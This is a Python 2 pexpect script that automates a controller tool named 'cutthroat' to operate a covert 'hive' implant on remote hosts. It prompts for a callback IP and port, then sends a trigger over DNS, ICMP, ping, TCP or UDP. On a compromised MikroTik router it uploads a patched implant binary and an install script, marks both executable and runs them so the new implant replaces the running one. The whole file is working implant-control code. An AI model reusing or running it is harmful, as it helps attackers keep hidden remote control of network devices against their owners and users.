#!/usr/bin/python

import pexpect, sys, os, time
from datetime import datetime

'''

    USAGE:	./fullControl.py <remoteIP>
  
    Currently, the second argument should be the IP address of the hive implant you want to trigger.
	NOTE:  A second argument will automatically overwrite any file with that second name...
    
    If there is no second argument, you will automatically create a file for that remote target.

    EXAMPLES:
	./fullControl.py
	./fullControl.py 10.2.9.6

'''


#print len(sys.argv)
#if len(sys.argv) == 1:
#	callbackIP = "10.3.2.19"
#	callbackPort = "8000"
#	remoteIP = "10.2.9.6" 
#	triggerProtocol = "dns-request"
#elif len(sys.argv) == 2:
if len(sys.argv) == 2:
	remoteIP_fileName = sys.argv[1]
	print 'remoteIP_fileName= '+remoteIP_fileName

	#Delete the file if it exists now for convenience...
	if os.path.isfile(remoteIP_fileName):
		print "\n\n\n Deleting file " + remoteIP_fileName + " for now...       Use this later to decide how to proceed!!\n\n\n"
		os.remove(remoteIP_fileName)

#Get input parameters...
callbackIP = raw_input('What is your callback IP address? ')
callbackPort = raw_input('What is your callback port? ')
remoteIP = raw_input('What is the remote target IP address? ')
if len(sys.argv) == 1:
	remoteIP_fileName=remoteIP

triggerProtocol = raw_input('Which trigger protocol [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]? ')
if triggerProtocol == "raw-udp":
	remotePort =  raw_input('What remote port will you be using? ')
elif triggerProtocol == "raw-tcp":
	remotePort =  raw_input('What remote port will you be using? ')




#           Pexpect starts cutthroat
#
#          ./cutthroat ./hive
#
#
#Starts cutthroat and displays the initial startup
commandLine="./cutthroat ./hive"
print "Trying to spawn "+commandLine
cutT = pexpect.spawn(commandLine)
now=datetime.now()
fileName="cutthroat_terminal_"+now.strftime('%Y%m%d_%H%M%S.')+"log"
fout = file(fileName, 'w')
cutT.logfile=fout
index = cutT.expect( ['> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )


if index == 0:
	print "Matched >"
	print cutT.before
	print cutT.after
elif index == 1:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Timeout of 20 occurred"
        print cutT.before
        print cutT.after

#
#
#            ilm connect ${remoteIP}
#
#
#connection='ilm connect 10.2.9.6'
connection='ilm connect '+remoteIP_fileName
cutT.sendline(connection)

#
#
#This section assumes the remoteIP file does not exist so it prompts the user for input...
#
#
index = cutT.expect( ['\? ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
       	print cutT.before
       	print cutT.after
elif index == 2:
	print "Timeout of 20 occurred"
       	print cutT.before
       	print cutT.after
#cutT.sendline('  10.3.2.19')    #callback address
cutT.sendline('  '+callbackIP)    #callback address

index = cutT.expect( ['\? ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
       	print cutT.before
       	print cutT.after
elif index == 2:
	print "Timeout of 20 occurred"
       	print cutT.before
       	print cutT.after
#cutT.sendline("  8000")        #callback port
cutT.sendline('  '+callbackPort)        #callback port

index = cutT.expect( ['\?   ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
       	print cutT.before
       	print cutT.after
elif index == 2:
	print "Timeout of 20 occurred"
       	print cutT.before
       	print cutT.after
#cutT.sendline("  10.2.9.6")    #remote IP Address
cutT.sendline('  '+remoteIP)    #remote IP Address

index = cutT.expect( [ '\? ', pexpect.EOF, pexpect.TIMEOUT ] , timeout=20 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
       	print cutT.before
       	print cutT.after
elif index == 2:
	print "Timeout of 20 occurred"
       	print cutT.before
       	print cutT.after
#cutT.sendline("  dns-request")
cutT.sendline('  '+triggerProtocol)

if (triggerProtocol == "raw-udp") or (triggerProtocol == "raw-tcp"):
	index = cutT.expect( [ '\? ', pexpect.EOF, pexpect.TIMEOUT ] , timeout=15 )
	if index == 0:
		print cutT.before
	elif index == 1:
		print "EOF occurred"
       		print cutT.before
       		print cutT.after
	elif index == 2:
		print "Timeout of 15 occurred"
       		print cutT.before
       		print cutT.after
	#cutT.sendline("  10000")
	cutT.sendline('  '+remotePort)


#
#
#      Sends the trigger...
#
#
index = cutT.expect( [' Trigger sent.', '> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
if index == 0:
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      Sent on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Matched >, raw-tcp post on remote host could not be reached..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 200 occurred"
        print cutT.before
        print cutT.after

print "\n\n Waiting... \n\n"
response="\["+remoteIP+"\]> "
#index = cutT.expect( ['Success', 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=200 )
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=200 )

if index == 0:
        print "Received response."
        print cutT.before
        print cutT.after
elif index == 1:
        print "Failure occurred"
        print cutT.before
        print cutT.after
elif index == 2:
        print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
        print "Timeout occurred. "
	now=datetime.now()
	print "      Trigger Timed out on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
        print cutT.before
        print cutT.after


#  This line is specific to mikrotik routers for now...
cutT.sendline("  file put hived-mikrotik-mipsbe-PATCHED /rw/pckg/newhive")
#
#
#      Sends the updated hive...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "Received response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      Updated hive sent as newhive on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 30 occurred"
        print cutT.before
        print cutT.after




#  This line is specific to mikrotik routers for now...
cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/newhive\"")
#
#
#      Makes the newhive executable...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "newhive executable response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      Updated newhive is executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 200 occurred"
        print cutT.before
        print cutT.after



#  This line is specific to mikrotik routers for now...
cutT.sendline("  file put installScript /rw/pckg/installScript")
#
#
#      Sends the installScript...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "installScript installed response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      installScript is put on device at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 30 occurred"
        print cutT.before
        print cutT.after


#  This line is specific to mikrotik routers for now...
cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/installScript\"")
#
#
#      Makes the installScript executable...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "installedScript executable response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      installScript is now executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 30 occurred"
        print cutT.before
        print cutT.after



#  This line is specific to mikrotik routers for now...
now=datetime.now()
cutT.sendline("  cmd exec /rw/pckg/installScript")
#
#
#      Runs the installScript ...    Note that the hive trigger should now timeout
#                                      since the install script should remove 
#                                      all currently running hive processes including
#                                      our currently triggered implant and replace the
#                                      existing hive with the new hive implant...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [ pexpect.TIMEOUT, response, 'Failure', pexpect.EOF] , timeout=30 )

if index == 0:
        print "Expected timeout occurred since the existing hive is currently being replaced..."
        print cutT.before
        print cutT.after
	print "      installScript was started at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
	now=datetime.now()
	print "      Hive should have been replaced by now at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Should never have gotten here...  ERROR   ERROR  ERROR"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Should never have gotten here...  ERROR   ERROR  ERROR"
        print cutT.before
        print cutT.after
elif index == 3:
	print "EOF occurred"
        print cutT.before
        print cutT.after


print "\n\n End of cutInterface.py\n\n"

